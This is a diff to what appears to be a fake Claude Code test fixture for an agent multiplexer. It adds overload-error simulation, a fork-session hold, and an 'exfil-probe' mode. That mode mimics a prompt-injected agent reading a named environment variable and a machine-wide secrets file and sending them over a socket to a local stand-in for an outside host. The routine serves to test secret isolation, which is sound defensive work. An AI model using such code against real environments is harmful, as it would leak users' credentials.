@@ -39,7 +39,8 @@ wait. A gate that says "read" reads them at a tool boundary (each echoed), then 
 the prompt is done. One that says "end" ends the turn first; the lines waiting then run as the
 next turn of Claude Code's own (echoed, "read: TEXT"), which waits for the next gate; "end-first"
 does the same with only the first waiting line, and the rest stay unread; "fail" ends the turn
-with a connection error. An interrupt is answered and changes nothing.
+with a connection error, and "overload" with the provider's "Repeated 529 Overloaded errors" (in
+the result Claude Code calls a success, `claude_stdio/api_error.rs`). An interrupt is answered and changes nothing.
 A stop_task control request ends its task killed (task_updated);
 FAKE_CLAUDE_STOP_NOTIFY=1 sends the task's task_notification too.
 "fg-shell" runs a foreground Bash call until a background_tasks control
@@ -481,6 +482,15 @@ def gated(prompt, base):
             send({"type": "result", "subtype": "success", "is_error": True, "num_turns": 1,
                   "result": "API Error: Connection error.", "duration_api_ms": 5})
             return
+        if how == "overload":
+            # As Claude Code ends a turn its retries gave up on: its own synthetic API error
+            # line, then a result that does not say it failed.
+            send({"type": "assistant", "message": {"id": "api-error", "model": "<synthetic>",
+                  "role": "assistant", "content": [{"type": "text",
+                  "text": "API Error: Repeated 529 Overloaded errors"}]}})
+            send({"type": "result", "subtype": "success", "is_error": False, "num_turns": 1,
+                  "result": "API Error: Repeated 529 Overloaded errors", "duration_api_ms": 5})
+            return
         if how == "read":
             for m in waiting:
                 send({"type": "user", "isReplay": True, "uuid": m.get("uuid"), "message": m.get("message")})
@@ -800,6 +810,13 @@ while True:
             send({"type": "control_response", "response": {"subtype": "error", "request_id": msg.get("request_id"),
                   "error": refusal}})
             continue
+        # FAKE_CLAUDE_HOLD_FORK_IF=<path>: a `--fork-session` start answers initialize only once
+        # that file is gone (a fork whose agent a daemon restart cuts off as it starts).
+        hold_fork = os.environ.get("FAKE_CLAUDE_HOLD_FORK_IF")
+        if request.get("subtype") == "initialize" and hold_fork and "--fork-session" in sys.argv:
+            import time
+            while os.path.exists(hold_fork):
+                time.sleep(0.05)
         # FAKE_CLAUDE_INIT_DELAY_MS: the initialize answer takes that long (a slow start).
         if request.get("subtype") == "initialize" and os.environ.get("FAKE_CLAUDE_INIT_DELAY_MS"):
             import time
@@ -1131,6 +1148,21 @@ while True:
         if asked.startswith("envs:"):
             names = [name.strip() for name in asked[5:].split(",") if name.strip()]
             text = json.dumps({name: os.environ.get(name, "") for name in names}, sort_keys=True)
+        # "exfil-probe NAME PORT": a prompt-injected agent hunting another chat's secret. It reads
+        # NAME from its environment and the machine-wide secrets file, and sends what it found to
+        # 127.0.0.1:PORT (the test's stand-in for an outside host). Replies what it had, as bools.
+        if asked.startswith("exfil-probe "):
+            import socket
+            name, port = asked[len("exfil-probe "):].split()
+            found = os.environ.get(name, "")
+            try:
+                with open(os.path.join(os.environ.get("HOME", "/nonexistent"), ".config", "cmux", "machine-secrets.env")) as f:
+                    on_disk = f.read()
+            except OSError:
+                on_disk = ""
+            with socket.create_connection(("127.0.0.1", int(port)), timeout=3) as out:
+                out.sendall(f"env={found}\nfile={on_disk}\n".encode())
+            text = json.dumps({"env": bool(found), "file": bool(on_disk)}, sort_keys=True)
         if said.endswith("settings-probe"):
             text = json.dumps({"said": said, "settings": FLAG_SETTINGS, "argv": sys.argv[1:],
                                "guidance": sum(1 for b in content if is_cmux_guidance(b))})
@@ -1490,7 +1522,7 @@ while True:
                       {"content": "Cover it", "status": "in_progress", "activeForm": "Covering it"},
                       {"content": "Update docs", "status": "pending", "activeForm": "Updating docs"}]}}]}})
         # "task-probe": the turn keeps its list with Claude Code 2.1's TaskCreate and TaskUpdate,
-        # which Claude Code offers only with CLAUDE_CODE_ENABLE_TODO_TOOLS=1 (acpmux sets it).
+        # which Claude Code offers only with CLAUDE_CODE_ENABLE_TODO_TOOLS=1 (acpmux never sets it).
         if said.strip() == "task-probe" and os.environ.get("CLAUDE_CODE_ENABLE_TODO_TOOLS") == "1":
             def task_call(tool_id, name, tool_input, result_text, tool_use_result):
                 send({"type": "assistant", "message": {"content": [
